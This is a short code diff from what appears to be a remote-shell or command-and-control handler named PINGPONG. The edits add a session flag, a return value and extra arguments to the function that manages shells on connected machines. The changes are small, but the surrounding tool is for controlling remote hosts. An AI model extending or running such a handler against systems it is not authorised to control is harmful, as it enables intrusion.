@@ -13,6 +13,8 @@ try:
 except:
     pass
 import PINGPONG_script.addsend as addsend
+global is_open
+is_open = True
 def start(ip, cmd_port, conn, main_port, _main_port=''):
     sessions_pool = main.get_value('connect_pool')
     if sessions_pool == None:
@@ -65,6 +67,7 @@ def cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_sessio
                     handler.PINGPONG_shell(conn, ip, main_port, _ip, port, False, '')
                 else:
                     main.main()
+                return True
             elif cmd_command == 'bg' or cmd_command == 'BG':
                 main.print_normal("CMD_SHELL>[*]Backgrounding session......")
                 main.set_config('connect_pool', sessions_pool)
@@ -85,7 +88,7 @@ def cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_sessio
             main.print_normal("handler>[*]Back to main console......")
             main.main()
 def run(conn, addr, my_addr):
-    if addsend.App_send("CMDSHELL_APP", True, conn):
+    if addsend.App_send("CMDSHELL_APP", True, conn, addr, my_addr):
         main.print_good("PINGPONG>[+]GOT IT")
         cmd_port = random.randint(5000, 8000)
         conn.send(bytes(str(cmd_port), "utf8"))
